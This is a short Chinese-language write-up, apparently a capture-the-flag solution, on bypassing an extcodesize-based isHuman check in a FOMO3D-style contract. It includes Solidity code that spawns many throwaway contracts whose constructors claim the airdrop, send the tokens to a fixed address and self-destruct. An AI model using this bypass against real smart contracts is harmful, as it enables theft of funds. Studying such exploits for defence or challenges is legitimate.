经典的FOMO3D漏洞。

这里检测 isHuman的机制可以被绕过！

> **当一个合约在执行构造函数的时候，其extcodesize也为0**!



只要绕过这个检测，就是写脚本薅羊毛的game了。

所以我们把攻击实现写在一个构造函数内

参考：

```solidity
contract father {
    function father() payable {}
    Son son;
    function attack(uint256 times) public {
        for(uint i=0;i<times;i++){
            son = new Son();
        }
    }
    function () payable {
    }
}
contract Son {
    function Son() payable {
        Fake3D f3d;
        f3d=Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);
        f3d.airDrop();
        if (f3d.balance(this)>=10)
        {
            f3d.transfer(0x357ec8b9f62e8a3ca819eebd49a793045b8b1e91,10);
        }
        selfdestruct(0x357ec8b9f62e8a3ca819eebd49a793045b8b1e91);
    }
    function () payable{
    }
}
```

